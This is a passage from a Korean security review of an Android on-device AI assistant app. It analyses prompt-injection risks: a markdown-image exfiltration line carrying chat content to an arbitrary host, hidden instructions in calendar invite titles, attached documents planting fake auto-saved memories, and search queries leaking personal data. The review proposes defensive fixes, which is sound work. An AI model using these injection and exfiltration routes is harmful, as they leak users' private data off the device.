[일부만 읽은 것] 범위 밖 호출부는 확인용으로 필요한 줄만 읽었다: DocumentViewerActivity(40~80줄)·DocumentViewerViewModel(205~245줄), MemoryViewModel(300~350줄), DataResetViewModel(60~95줄), MorningBriefingGenerator(95~125줄), domain/document 의 DocumentSupport(95~145줄)·CsvReader(15~40줄), MemoryEmbedder·EmbeddingGemmaRunner 는 grep 만.
[읽지 않은 것] platform/speech/SpeakableText, platform/device 2개, platform/memory/MemoryEmbedder 본문(맡은 범위 목록에 없음), IsoDateTimeParser(알림 시각이 시간대 변경에 어떻게 반응하는지는 미확인), ReminderEditor·AddReminderToolExecutor 본문, 테스트 코드 전부.
[실행하지 않은 것] 규칙대로 gradle·adb·실험은 돌리지 않았다. 따라서 platform-3(Doze), platform-5(최근 앱 재실행), platform-6(PdfRenderer 가 던지는 예외 종류), platform-7(Glance 세션 재사용)은 코드 + 안드로이드 동작 지식에 근거한 판단이며 confidence 를 medium 으로 두었다 — 모두 에뮬레이터에서 몇 분 안에 재현 확인이 가능하다. 그래프 도구(codebase-memory-mcp)는 쓰지 않고 grep 으로만 호출자를 확인했다.
[기록 대조] docs/CHANGELOG.md·docs/architecture.md·docs/plans·docs/checklists 를 키워드(강제 종료, restoreAll, 재부팅 복원, 시간대, 반복 일정/Instances/RRULE, LAUNCHED_FROM_HISTORY, CP949, 정확 알람, 위젯 갱신, 색인·백그라운드)로 grep 했다.
[10건을 넘겨 뺀 것 — 6건]
1) 브리핑 알림 워커가 예외로 실패하면 자기 재예약이 끊긴다(BriefingNotificationWorker 42~60줄) — 앱을 열 때마다 MorningBriefingGenerator.start 가 KEEP 정책으로 다시 걸어 주어 매일 쓰는 실사용에서는 스스로 회복되므로 뺐다.
2) 브리핑 예약이 예약 시점의 시간대로 지연을 계산해 해외 이동 시 하루 어긋날 수 있다 — 드문 상황이라 platform-1 의 시간대 방송 제안에 묶었다.
3) AudioRecorder.startRecording 을 연달아 부르면 이전 AudioRecord 가 해제되지 않고, 초기화 실패(90~92줄) 시 release 가 없다 — 화면 쪽이 중복 호출을 막는지 확인하지 못했고 영향이 작다.
4) SpeechOutput 의 상태 필드가 TTS 콜백 스레드와 메인에서 동기화 없이 바뀐다 — 재현 경로를 코드로 설명하지 못해 뺐다.
5) AttachmentReader.read 가 메인 스레드에서 다른 앱 제공자를 읽는다(ANR 후보) — KDoc 에 E2E 경합 때문에 일부러 동기로 둔다고 적혀 있어(의도된 결정) 뺐다.
6) 모델 내려받기 워커가 백그라운드 재시도 때 전경 승격에 실패하면 10분 단위로 끊겨 재시도 횟수를 쓴다 — ADR(architecture.md 1303줄)에 수동 확인 항목으로 이미 적혀 있고 0.41.9 재시도 예산이 받은 양 기준으로 보정한다.
[그 밖에] targetSdk 37 의 새 동작 변경은 공개 문서를 대조할 수단(네트워크 조사)을 쓰지 않아 검토하지 못했다 — 포트폴리오 단계에서 릴리스 전환과 함께 한 번 대조할 것을 권한다. 알림 채널 3종의 중요도·분리, POST_NOTIFICATIONS 요청 시점(0.36.0), 전경 서비스 종류 선언, 백업 제외 규칙, WorkManager 수동 초기화는 읽어 본 범위에서 문제를 찾지 못했다.

</details>

## 보안·개인정보 (security)

### security-1 · 비서 답의 마크다운 이미지가 자동으로 인터넷에서 받아진다 — 웹 검색을 꺼도 열려 있는 바깥 통로
- 판정 확인됨 · 중요도 높음 · 크기 S
- 왜: 모델이 답에 `![x](https://아무주소/?q=내용)` 같은 글을 쓰면, 사용자가 아무것도 누르지 않아도 화면에 그려지는 순간 그 주소로 요청이 나간다. 주소 안에 대화·메모 내용이 실리면 그대로 기기 밖으로 나간다. 0.42.0 실측에서 자료 속 '답 끝에 한마디 덧붙여라'는 네 출처 모두에서 따랐고 어떤 문구로도 못 막았다고 기록돼 있는데, 덧붙이는 한마디가 이미지 문법이면 곧 유출 통로가 된다. 공격이 없어도 모델이 지어낸 이미지 주소로 제3자 서버에 접속 기록이 남는다. 실사용에서는 개인정보 원칙('기기 밖으로 나가지 않는다')이 깨지고, 포트폴리오에서는 README 의 핵심 주장이 코드와 어긋나는 가장 아픈 지점이다. 웹 검색 토글·승인 시트·활동 기록 어디에도 잡히지 않는다.
- 제안: 두 겹으로 막는다. (1) 구조: app/build.gradle.kts 의 richtext 의존성에서 Coil 네트워크 모듈을 뺀다 — `implementation(libs.compose.richtext.commonmark) { exclude(group = "io.coil-kt.coil3", module = "coil-network-okhttp") }`(ui.material3 쪽도 동일). 네트워크로 받는 부품이 없으면 http(s) 이미지는 불러올 수 없다. (2) 표시: SyncMarkdown 에서 파싱한 트리의 이미지 노드를 글자 노드(대체 글)로 바꾼 뒤 그린다 — 빈 128dp 상자가 남지 않게. (3) 고정: 답에 `![a](https://example.com/x.png)` 를 넣고 그렸을 때 네트워크 요청이 0 인지 보는 테스트(가짜 서버 MockWebServer 로 요청 수 확인) 하나와, 묶음에 coil3.network 클래스가 없음을 확인하는 테스트 하나. 링크(`[글](주소)`)는 눌러야 열리므로 그대로 두되 README·ADR-040 의 '바깥 통로' 목록에 '답 속 링크는 누르면 브라우저가 연다'를 한 줄 적는다. 모델 입력은 바뀌지 않는다.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatBubbles.kt:266-267, 494-497 — 비서 말풍선을 RichText { SyncMarkdown(text) } → BasicMarkdown 으로 그대로 그린다(이미지 문법을 거르는 처리 없음)
  - app/src/main/java/com/kosmos/app/feature/chat/BriefingCard.kt:77-78 — 사용자 입력 없이 자동 생성되는 아침 브리핑도 같은 SyncMarkdown 으로 그린다
  - compose-richtext 1.0.0-alpha05 소스(richtext-markdown-android-sources.jar) MarkdownRichText.kt:96-110 · androidMain MarkdownImage.kt — `![..](url)` 을 만나면 Coil(rememberAsyncImagePainter)로 url 을 바로 불러온다
  - app/build/intermediates/incremental/lintAnalyzeDebug/debug-artifact-dependencies.xml:348, 515 — 앱에 실제로 묶이는 목록(package)에 io.coil-kt.coil3:coil-network-okhttp-jvm:3.3.0 이 있다(richtext 가 끌고 온 것, app/build.gradle.kts:188-189 · gradle/libs.versions.toml:33-34)
  - app/src/main/AndroidManifest.xml:5 — INTERNET 권한이 있어 요청이 실제로 나간다
  - README.md:29 · docs/guide/USER_GUIDE.md:82 — '인터넷을 쓰는 것은 모델 내려받기와 직접 켠 위키백과 검색뿐'이라고 적혀 있다
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:242 · docs/architecture.md:2295 — 코드 주석과 설계 기록도 위키 검색을 '유일한' 바깥 통로로 전제한다
- 검증: 직접 확인. app/src/main/java/com/kosmos/app/feature/chat/ChatBubbles.kt:266-267, 493-497 — 비서 말풍선이 SyncMarkdown(text) → CommonmarkAstNodeParser → BasicMarkdown 으로 가공 없이 그려지고 이미지 노드를 거르는 곳이 없다(app/src/main 에 AstImage 처리·이미지 문법 제거 grep 0건). BriefingCard.kt:77-78 도 같은 경로. 라이브러리 소스(Gradle 캐시의 richtext-markdown-android-sources.jar 1.0.0-alpha05)를 풀어 확인: commonMain MarkdownRichText.kt:96-103 이 AstImage 를 만나면 MarkdownImage 를 부르고, androidMain MarkdownImage.kt:19-43 이 coil3 rememberAsyncImagePainter(ImageRequest) 로 주소를 바로 불러온다. 앱에 묶이는 목록(app/build/intermediates/incremental/lintAnalyzeDebug/debug-artifact-dependencies.xml:348, 515)에 coil-network-okhttp-jvm:3.3.0 · coil-network-core 가 있고 저장소 코드에는 coil 을 직접 쓰는 곳이 없어(grep 0) Coil 3 의 기본 로더가 네트워크 부품을 자동 등록하는 구성이다. AndroidManifest.xml:5 INTERNET 권한. README.md:29, docs/guide/USER_GUIDE.md:82, BaseAgent.kt:242('웹 검색은 유일한 네트워크 egress'), docs/architecture.md:2295 가 모두 위키 검색을 유일한 바깥 통로로 전제한다. CHANGELOG·architecture·plans 에 coil·마크다운 이미지 기록 없음. 한계: 실제 요청이 나가는지는 실행하지 않았다(읽기 전용) — 코드 경로로는 성립하지만 '모델이 이미지 문법을 주소에 내용까지 실어 쓰는 빈도'는 미측정. 제안의 exclude 는 모듈 이름을 실제 좌표(coil-network-okhttp, -jvm 변형)와 맞춰야 하고, 네트워크 부품을 빼도 base64 data 주소는 그려진다(무해). 심각도 high 유지 — 조작 없이 열리는 통로이고 고치는 비용이 작다.

### security-2 · 기기 캘린더의 일정 제목이 아무 표시 없이 모델에 들어간다 — 남이 보낸 초대도 포함, 0.42.0 주입 실측에서 빠진 출처
- 판정 확인됨 · 중요도 중간 · 크기 M · 모델 입력
- 왜: 구글·삼성·회사 계정 캘린더는 남이 보낸 초대가 수락 전에도 일정으로 들어오는 설정이 흔하다. 즉 사용자가 아무것도 하지 않아도 남이 쓴 글(초대 제목)이 모델 입력이 되는 유일한 출처인데, 0.42.0 실측·처방·회귀 세트에서 빠져 있다. 특히 아침 브리핑은 자동으로 돌고, 같은 프롬프트에 최근 대화 요약이 함께 있으며, 결과가 마크다운으로 그려진다(security-1) — 세 가지가 겹치면 '초대 한 통 → 브리핑 → 바깥 요청'이 사용자 조작 없이 이어질 수 있다. 4B 모델이 실제로 따르는지는 재지 않았으므로 추정이지만, 포트폴리오에서 '주입 방어를 실측으로 다뤘다'고 말하려면 이 출처가 빠진 이유를 설명할 수 있어야 한다.
- 제안: (1) 먼저 잰다: 실험실 주입 문항과 회귀 세트 `inject` 에 '일정 제목 속 숨은 지시'(일정 조회 결과, 아침 브리핑 두 경로)를 더해 따르는 비율을 본다. (2) 글자를 안 바꾸는 선택 줄이기: readEvents 에서 내 참석 상태가 '초대만 받음/거절'(Events.SELF_ATTENDEE_STATUS = INVITED·DECLINED)인 일정은 모델 입력(툴 결과·브리핑)에서 뺀다 — 화면 달력에는 그대로 보여도 된다. 수락하지 않은 초대가 모델에 닿지 않게 하는 것이 핵심이다. (3) 기기에서 온 제목은 줄바꿈을 지우고 길이 상한(예: 60자)을 둔다. (2)(3)은 툴 결과·브리핑 입력이 달라지므로 실측과 회귀 세트 확인 뒤에 넣고, 결과를 ADR-040 의 한계 목록에 적는다. security-1 을 먼저 막으면 이 항목의 최악 경우(바깥 유출)는 사라지고 '답 왜곡' 수준으로 내려간다.
- 근거:
  - app/src/main/java/com/kosmos/app/platform/calendar/AndroidCalendarTool.kt:33-71 — CalendarContract.Events 전체를 기간 조건만으로 읽는다(어느 계정·누가 만든 일정인지, 초대 수락 여부를 가리지 않음)
  - domain/src/main/java/com/kosmos/app/domain/usecase/GetTodayScheduleUseCase.kt:125-128 — 기기 일정을 앱 일정과 합쳐 그대로 돌려준다
  - app/src/main/java/com/kosmos/app/assistant/tool/GetScheduleToolExecutor.kt:67 — 툴 결과에 `- ${event.title} (시각)` 으로 제목을 그대로 넣는다(자료 표지 없음, 제목 길이 상한 없음)
  - domain/src/main/java/com/kosmos/app/domain/usecase/GenerateBriefingUseCase.kt:112, 123 — 아침 브리핑 프롬프트에 일정 제목과 최근 대화 요약이 함께 들어간다
  - app/src/main/java/com/kosmos/app/assistant/briefing/MorningBriefingGenerator.kt:121-143 — 브리핑은 엔진 준비 뒤 사용자 입력 없이 자동으로 돈다
  - docs/plans/0.42.0-injection-defense-and-tool-routing.md:23 — 실측한 출처는 첨부 문서·문서 검색·위키·기억 검색 넷뿐(캘린더 없음)
- 검증: 코드 사실은 맞다. app/src/main/java/com/kosmos/app/platform/calendar/AndroidCalendarTool.kt:39-62 — Events 표를 DTSTART/DTEND 겹침 조건만으로 읽고 projection 에 참석 상태·계정·삭제 여부가 없다(파일 전체에서 ATTENDEE grep 0). GetTodayScheduleUseCase.kt:125-128 기기 일정 병합, GetScheduleToolExecutor.kt:67 `- ${event.title} ($display)` 그대로(자료 표지·길이 상한 없음), GenerateBriefingUseCase.kt:112·119-123 에서 일정 제목과 최근 대화 요약이 한 프롬프트에 들어간다. 0.42.0 계획서 D2 는 네 출처만 적고 캘린더가 없다. 단 '모델이 실제로 따르는지', '초대가 수락 전에 Events 에 들어오는 기기 설정인지'는 미측정 추정이다 — 위험 등급이지 결함 확정이 아니다. 최악 경로(바깥 유출)는 security-1 에 의존하므로 그쪽을 막으면 '답 왜곡' 수준으로 내려간다. 제안 (2)(3)은 툴 결과·브리핑 입력을 바꾸므로 실측·회귀 세트가 선행돼야 한다(모델 입력 변경 표시 맞음).
- 앞선 기록: CHANGELOG 0.42.0 · ADR-040(docs/architecture.md:2286-2295) · docs/plans/0.42.0-injection-defense-and-tool-routing.md:23 — 실측 출처는 첨부 문서·문서 검색·위키·기억 검색 넷. 캘린더 제목·초대에 대한 기록 없음

### security-3 · 자동 기억 저장이 첨부 문서 속 글을 '사용자가 한 말'로 취급한다 — 승인 없이 가짜 기억이 남을 수 있는 길
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 대화 중 메모 저장은 승인 카드가 막지만, 대화가 끝난 뒤 도는 자동 추출은 승인이 없다. 그런데 추출 재료에 첨부 문서(다른 앱에서 받은 파일·공유 글)가 사용자 발언으로 섞여 들어가고, 숫자 검사도 문서를 사용자 발언으로 본다. 문서에 '사용자의 현관 비밀번호는 0000이다' 같은 문장이 있으면 그것이 자동 메모로 저장돼 이후 기억 검색에 계속 나올 수 있다 — 한 번의 대화가 아니라 오래 남는 오염이다. 위키 결과를 옮긴 비서 답도 숫자가 없으면 같은 길로 들어갈 수 있다. 실제로 저장되는지는 재지 않았다(추정). 자동 저장 예외를 결정할 때(9월)에는 문서 첨부·주입 방어(11월)가 고려되지 않았다는 점이 빈틈이다.
- 제안: 자동 저장 예외는 그대로 두고 재료만 좁힌다(모델 입력 불변, 결정적 규칙). EpisodeFactExtractor 에서 (1) userText 를 만들 때 AttachedDocumentBlock.bodyOrNull(content) 이 null 이 아닌 메시지를 뺀다 — 문서 속 숫자는 '사용자가 말한 숫자'가 아니다. (2) KnowledgeAutoSaveFilter 에 건너뛸 이유 하나를 더한다: 추출한 사실이 첨부 문서 본문과는 많이 겹치는데(기존 BigramMatcher.containment) 사용자가 직접 친 글과는 겹치지 않으면 저장하지 않는다. 판정 표 테스트를 KnowledgeAutoSaveFilterTest 에 더한다. 더 근본적인 길(추출·요약 전사에서 첨부 블록을 아예 빼기)은 부수 추론의 입력을 바꾸므로 실측 뒤 별도 회차로. ADR-040 에 '승인 없는 쓰기 경로 = 자동 추출'과 이 가드를 한 줄 적는다.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/orchestrator/AssistantOrchestrator.kt:122-123 — 첨부 문서를 USER 역할 메시지로 저장한다
  - domain/src/main/java/com/kosmos/app/domain/usecase/EpisodeTranscript.kt:27-36 — 요약·추출용 전사에 USER 메시지를 가리지 않고 '사용자: …' 로 싣는다(첨부 블록 포함)
  - app/src/main/java/com/kosmos/app/assistant/episode/EpisodeFactExtractor.kt:96 — 숫자 출처 검사에 쓰는 userText 가 USER 메시지 전부라 첨부 문서 속 숫자도 '사용자가 말한 숫자'로 통과한다
  - app/src/main/java/com/kosmos/app/assistant/episode/EpisodeFactExtractor.kt:48-50, 115 — 추출한 지식은 승인 없이 source=auto 로 저장한다(쓰기=승인 원칙의 의도적 예외, 2026-09-02 결정)
  - app/src/main/java/com/kosmos/app/assistant/tool/AddMemoryToolExecutor.kt:33-35 — 메모 저장 툴에는 '주입된 문서가 가짜 기억을 심는 경로라 승인을 요구한다'고 적혀 있다
  - domain/src/main/java/com/kosmos/app/domain/memory/KnowledgeAutoSaveFilter.kt:65-71 — 모델이 '비서의 발언은 제외' 지시를 어긴 실측이 있어 숫자만 글자로 다시 확인한다(숫자가 없는 사실은 걸러지지 않음)
- 검증: 코드 경로 확인. AssistantOrchestrator.kt:118-123 첨부 문서를 USER 역할로 저장. domain/.../usecase/EpisodeTranscript.kt:27-36 은 USER 메시지를 구분 없이 '사용자: …' 로 싣고(AttachedDocumentBlock 을 쓰는 곳은 Orchestrator·ChatBubbles·DataMarker 뿐 — 전사·추출 쪽 grep 0), ExtractFactsUseCase.kt:58 이 그 전사를 쓴다. EpisodeFactExtractor.kt:96 userText 가 USER 전부라 KnowledgeAutoSaveFilter.kt:59·70-73 의 숫자 출처 검사가 문서 속 숫자를 통과시키고, 숫자 없는 사실은 원래 안 걸린다. 115행에서 승인 없이 SOURCE_AUTO 저장. AddMemoryToolExecutor.kt:33-35 주석은 같은 위험(주입된 문서가 가짜 기억)을 승인 이유로 든다 — 자동 경로에는 그 방어가 없다. 한계: 실제로 문서 문장이 추출·저장되는지는 미측정(추출 지시·전사 토큰 상한에 따라 긴 문서는 잘린다). 자동 저장 예외 자체는 사용자 결정이라 유지하고 재료만 좁히는 제안 방향이 맞다. 제안 (1)은 모델 입력 불변, 전사에서 첨부를 빼는 근본안은 부수 추론 입력 변경이라 실측 필요.
- 앞선 기록: CHANGELOG 0.24.0(자동 저장은 쓰기=승인의 의도적 예외, 2026-09-02 사용자 결정 — EpisodeFactExtractor.kt:48-50 주석) · 0.36.0(KnowledgeAutoSaveFilter) · ADR-040 — 자동 추출 경로와 첨부 문서의 결합은 기록 없음

### security-4 · 모델 내려받기가 '지금의 main' 을 받고 크기만 확인한다 — 실측의 기준이 된 모델 파일이 고정돼 있지 않다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 M
- 왜: 이 프로젝트의 프롬프트 예산·가드·회귀 세트는 전부 특정 모델 파일로 잰 값인데, 앱은 그 파일이 아니라 '받는 날의 main' 을 받는다. 배포 저장소가 파일을 바꾸면 새로 설치한 기기는 실측과 다른 모델로 돌고, 크기만 같으면 알 길이 없다(공급망 변조도 같은 경로). 실사용에서는 재설치·기기 교체 때 조용히 달라질 수 있고, 포트폴리오에서는 '실측으로 결정한다'는 원칙의 재현성 약점이다. '수 분' 근거도 다시 볼 만하다 — 요즘 기기의 SHA-256 은 초당 1GB 안팎이라 3.6GB 는 십여 초 수준일 가능성이 크다(추정, 미측정).
- 제안: (1) 주소를 버전에 고정한다: `resolve/main/` 을 실측에 쓴 커밋 해시 `resolve/<커밋>/` 로 바꾼다 — 그 주소의 내용은 바뀌지 않는다. (2) 기대 SHA-256 을 Constants 에 두고 ModelDownloadService.verifyAndFinalize 에서 .part 를 스트림으로 한 번 읽어 비교한다(기본 주소로 받은 경우만, 사용자 주소는 건너뜀). 다르면 Permanent 실패로 지우고 안내. 대형 파일은 서버 ETag 가 내용 해시인 경우가 많으니 probe 의 ETag 와 상수 비교를 값싼 1차 확인으로 먼저 넣어도 된다. (3) 검증에 걸리는 시간을 에뮬레이터에서 한 번 재 ADR-006 의 '수 분' 문장을 실제 값으로 고친다. (4) 외부 폴더 우선 탐색은 디버그 빌드에서만 하도록 좁히는 것을 릴리스 전환 회차의 할 일로 적어 둔다(지금은 디버그 실사용이라 동작 변화 없음). 모델 버전을 올릴 때 주소·해시·회귀 세트를 함께 바꾸는 절차를 AGENTS 의 의존성 줄에 한 줄 더한다.
- 근거:
  - core/src/main/java/com/kosmos/app/core/common/Constants.kt:232, 239-240 — 두 모델 주소가 모두 huggingface `resolve/main/…` (특정 버전이 아니라 저장소의 최신 상태)
  - data/src/main/java/com/kosmos/app/data/network/ModelDownloadService.kt:260-265 — 확정 전 검사는 크기 비교 하나(서버가 알려 준 크기와 같으면 통과)
  - data/src/main/java/com/kosmos/app/data/network/ModelDownloadService.kt:109 — ETag 는 이어받기 판정에만 쓰고 내용 확인에는 쓰지 않는다
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaRuntimeManager.kt:61-67 — 빌드 종류와 무관하게 앱 외부 폴더(Android/data/…/files/models)의 파일을 내부 폴더보다 먼저 고른다
  - docs/architecture.md:1300 — '무결성 검증(수용된 리스크): 크기 비교만 한다. 3.6GB SHA-256은 수 분이 걸려 실용적이지 않다'
- 검증: 사실은 맞다: core/.../Constants.kt:232, 240 두 주소 모두 huggingface `resolve/main/`, data/.../ModelDownloadService.kt:260-265 확정 전 검사는 크기 비교 하나, GemmaRuntimeManager.kt:61-67 외부 폴더 우선. 그러나 항목의 절반(SHA-256 검증)은 ADR-006 에 '수용된 리스크'로 적힌 결정을 다시 여는 것이라 그 부분은 이미 결정됨이다 — 'SHA-256 이 십여 초'는 제안자도 미측정 추정이라 결정을 뒤집을 근거가 아직 없다. 새로 남는 것은 '주소가 main 이라 실측 기준 파일이 고정돼 있지 않다'는 재현성 지적 하나이고(기록 없음, 커밋 해시 주소로 바꾸는 한 줄 수준), 이것은 타당하다. 외부 폴더 우선은 앱 전용 외부 폴더(Android/data/…)라 요즘 안드로이드에서 다른 앱이 못 쓰므로 위험 근거로는 약하다. 이미 받은 기기에는 영향이 없고 재설치·새 기기에서만 걸리므로 심각도 low 로 내린다.
- 앞선 기록: ADR-006(docs/architecture.md:1300 — '무결성 검증(수용된 리스크): 크기 비교만 한다') · CHANGELOG 0.41.16(ModelInfo.from 기각, CHANGELOG:244)

### security-5 · 디버그 빌드로 매일 쓰는 동안은 '앱 샌드박스가 지킨다'는 전제가 약해진다 — 프롬프트 전문 로그와 adb 로 DB 꺼내기
- 판정 이미 결정·기록됨 · 중요도 낮음 · 크기 S
- 왜: 실사용을 디버그 빌드로 하기로 했으므로(결정 존중), 로그 제거·샌드박스 강화는 포트폴리오 단계까지 오지 않는다. 그동안 매일의 실제 대화·프로필이 logcat 에 전문으로 흐르고, 제조사 오류 보고서(버그 리포트)를 만들거나 USB 디버깅이 허용된 PC 에 연결하면 DB 까지 그대로 읽힌다. 현실 위험은 낮지만(내 PC·내 폰), ADR-032 와 README 가 말하는 보호 근거가 지금 쓰는 빌드에는 그대로 적용되지 않는다는 점은 면접에서 바로 나올 질문이다.
- 제안: 릴리스 전환 없이 할 수 있는 것만. (1) 앞부분 전문 덤프를 '늘 켜짐'에서 '켰을 때만'으로: 이미 있는 디버그 파일 방식(debug_mtp.txt·debug_embed.txt 를 읽는 그 자리)에 `debug_preface.txt` 가 있을 때만 logConversationCreated 의 preface 조각을 찍는다. 평소에는 길이·토큰 수 한 줄만 남긴다. 진단이 필요하면 파일 하나로 다시 켠다. (2) recordRunaway 의 Log.w 에서 출력 앞 60자(head)를 빼고 파일에만 남긴다. (3) ADR-032 에 보충 한 줄: '디버그 빌드 실사용 기간에는 adb run-as·logcat 으로 열린다 — 평소 USB 디버깅 끄기, 오류 보고서 공유 전 확인'을 적고 docs/checklists 의 실사용 시작 목록에 'USB 디버깅 끄기'를 넣는다.
- 근거:
  - app/src/main/java/com/kosmos/app/runtime/gemma/RuntimeDiagnostics.kt:138-153 — 디버그 빌드에서는 대화를 새로 만들 때마다 앞부분 전체(시스템 지시·프로필·대화 기록)를 1,500자씩 나눠 logcat 에 찍는다. 같은 파일 127행 주석이 '사용자 발화가 새는 경로'라고 적고 있다
  - app/src/main/java/com/kosmos/app/runtime/gemma/RuntimeDiagnostics.kt:94-104 — 폭주 진단이 모델 출력 앞 60자를 로그와 앱 외부 폴더 파일(diag_runaway.txt)에 남긴다(로그 한 줄은 릴리스에서도 찍힘)
  - scratch/lab/pull_device_state.sh:28, 40 — 저장소의 스크립트가 `adb run-as com.kosmos.app` 로 DB 와 녹음 파일을 꺼낸다(디버그 빌드라 가능)
  - docs/architecture.md:2144 — ADR-032 는 '다른 앱·외부 접근은 안드로이드 샌드박스가 차단'을 근거로 DB 암호화를 두지 않기로 했다
  - docs/plans/0.43.0-real-use-prep.md:12, 21 — 로그에 프롬프트가 남는 것과 릴리스에서 지우는 안(D2)은 알고 있고 보류 상태
- 검증: 코드 사실은 맞다: RuntimeDiagnostics.kt:135-153 디버그 빌드에서 앞부분 전체를 조각으로 logcat 에 찍고(127행 주석이 '사용자 발화가 새는 경로'라고 스스로 적음), 97-104행 폭주 줄에 출력 앞 60자, scratch/lab/pull_device_state.sh:28·40 이 run-as 로 DB·녹음을 꺼낸다. 하지만 디버그 빌드 프롬프트 로그는 0.41.14 외부 분석 대조에서 이미 '의도'로 기각된 항목이고, 디버그 빌드 실사용과 로그 제거 보류도 사용자 결정이다. 새로 남는 것은 문서 한 줄(ADR-032 에 '디버그 빌드 기간에는 adb·logcat 으로 열린다' 보충, 실사용 시작 목록에 USB 디버깅 끄기)뿐 — docs/checklists/real_use_start.md 에 USB 디버깅 항목이 없는 것은 확인했다. 그 문서 보충만 받을 가치가 있다.
- 앞선 기록: CHANGELOG 0.41.14(docs/CHANGELOG.md:265) · docs/plans/0.41.14-app-robustness.md:28 — '디버그 빌드 프롬프트 로그(의도)'로 기각 · docs/plans/0.43.0-real-use-prep.md D2(릴리스에서 Log.d 제거 — 보류) · docs/checklists/real_use_start.md:4(매일 쓸 빌드는 디버그 그대로) · ADR-032

### security-6 · 위키백과로 나가는 검색어에 길이·내용 제한이 없다 — 설계 기록이 인정한 '이론상 유출 경로'에 값싼 가드가 없다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 웹 검색을 켠 상태에서 첨부 문서·문서 검색 결과 속 지시가 모델에게 '이 내용을 검색해라'를 시키면, 검색어가 곧 바깥으로 나가는 글이 된다. 지금은 한 번에 몇백 자든 보낼 수 있고 전화번호·이메일도 그대로 나간다. 활동 기록에 남기는 쪽(logSearchEvent)은 가려서 저장하면서 정작 실제로 내보내는 글은 가리지 않는다. 기본이 꺼져 있어 급하지는 않지만, 한계를 문서에 적어 두고 값싼 방어를 안 둔 상태다.
- 제안: 실행기에서 결정적으로 막는다(툴 선언·결과 문구 불변). (1) 검색어 길이 상한(예: 80자)을 두고 넘으면 앞부분만 보낸다 — 위키 표제어 검색에 긴 문장은 필요 없다. (2) 내보내기 전에 Redaction 의 이메일·전화번호 패턴을 검색어에도 적용한다. (3) 한 턴에 위키 호출 횟수 상한이 이미 있는지 확인하고(BaseAgent 의 MAX_CALLS_PER_STEP) 없으면 턴당 1~2회로. (4) 식별 문자열은 BuildConfig 버전을 쓰거나 버전을 뺀다. 테스트: 긴 검색어·전화번호가 든 검색어가 가짜 서버에 어떻게 도착하는지. ADR-040 한계 줄에 이 가드를 덧붙인다.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/tool/SearchWikipediaToolExecutor.kt:34 — topic 을 requireString 으로 받아 그대로 넘긴다(길이·형식 검사 없음)
  - data/src/main/java/com/kosmos/app/data/tool/WikipediaSearchToolImpl.kt:49 — gsrsearch 에 topic 전체를 실어 보낸다
  - core/src/main/java/com/kosmos/app/core/security/ApprovalRules.kt:28-31 — 웹 검색은 건별 승인 없이 전역 토글만
  - docs/architecture.md:2295 — '숨은 지시가 검색어에 개인 정보를 싣게 하는 경로가 이론상 남는다(기본 꺼짐, 미측정)'
  - data/src/main/java/com/kosmos/app/data/tool/WikipediaSearchToolImpl.kt:133 — 보내는 식별 문자열이 'KOSMOS/0.8.0' 으로 굳어 있다(현재 0.42.10)
- 검증: 확인. SearchWikipediaToolExecutor.kt:34 topic 을 requireString 으로 받아 그대로 넘기고, data/.../WikipediaSearchToolImpl.kt:49 gsrsearch 에 전체를 싣는다(길이·형식 검사 없음). ApprovalRules.kt:28-31 건별 승인 없음. AuditTrailService.kt:96-98 은 기록에 남길 때만 가린다. WikipediaSearchToolImpl.kt:133 식별 문자열 'KOSMOS/0.8.0' 고정도 맞다. 제안 (3)은 이미 있다 — BaseAgent.kt:190·568 MAX_CALLS_PER_STEP=3(한 차례 3건, 툴 구분 없는 상한)이라 위키 전용 상한을 새로 둘지는 선택. 한계는 이미 ADR 에 적혀 있고 기본 꺼짐이라 low. 검색어 자르기·가리기는 실행기 안의 결정적 처리라 모델 입력은 안 바뀌지만, 잘린 검색어로 결과가 달라질 수 있으니 상한은 넉넉히.
- 앞선 기록: ADR-040 한계(docs/architecture.md:2295 — 위키 검색어에 개인 정보가 실리는 경로가 이론상 남음, 기본 꺼짐, 미측정) · CHANGELOG 0.42.0

### security-7 · 메모를 지워도 그 내용이 활동 기록·대화·대화 요약에 남는다 — '지웠다'의 범위가 화면에 안 나온다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 메모에 현관·노트북 비밀번호 같은 값을 넣는 앱인데(ADR-032 가 그렇게 적고 있다), 잘못 저장한 메모를 기억 화면에서 지우거나 '메모'만 초기화해도 같은 내용이 활동 기록의 승인 줄·대화 말풍선·대화 요약에 그대로 남고, 내보낸 백업 ZIP 에도 실린다. 사용자는 지웠다고 믿는다. 해시 체인은 '기록을 못 지우게' 설계됐으므로 구조적으로 충돌하는 지점이고, 포트폴리오에서 '삭제는 어떻게 보장하나'라는 질문에 답이 필요하다.
- 제안: (1) 안내를 맞춘다: 메모 초기화 설명과 기억 화면의 삭제 확인에 '이 메모를 다룬 대화와 활동 기록에는 남아요. 완전히 지우려면 대화 기록도 함께 초기화하세요'를 한/영으로 넣는다(USER_GUIDE 두 파일도). (2) 승인·거절 기록에 넣는 설명은 내용 대신 종류와 글자 수만 남기는 안을 검토한다 — 단, EpisodeFactExtractor.rejectedMemories 가 거절 기록의 원문을 읽어 자동 저장을 막고 있으므로(155-159행) 거절 쪽은 그대로 두고 승인 쪽만 줄이거나, 줄이려면 그 가드를 다른 근거로 옮겨야 한다. (3) ADR-039 에 '변경 감지 기록과 삭제 요구의 충돌 — 대화 초기화가 유일한 완전 삭제 수단'을 한계로 적는다.
- 근거:
  - data/src/main/java/com/kosmos/app/data/local/repository/DataResetRepositoryImpl.kt:35-42 — 메모 초기화는 knowledge_note(와 벡터)만 지운다. 활동 기록·대화는 '대화 기록' 대상에만 묶여 있다
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:462, 465 — 승인·거절 기록에 '메모 저장: 저장할 내용: …'(앞 80자)이 가림 처리 없이 들어간다
  - domain/src/main/java/com/kosmos/app/domain/audit/AuditTrailService.kt:52-56, 76-80 — 모델 실행·툴 결과 기록에도 프롬프트·기억 검색 결과가 500자까지 남는다
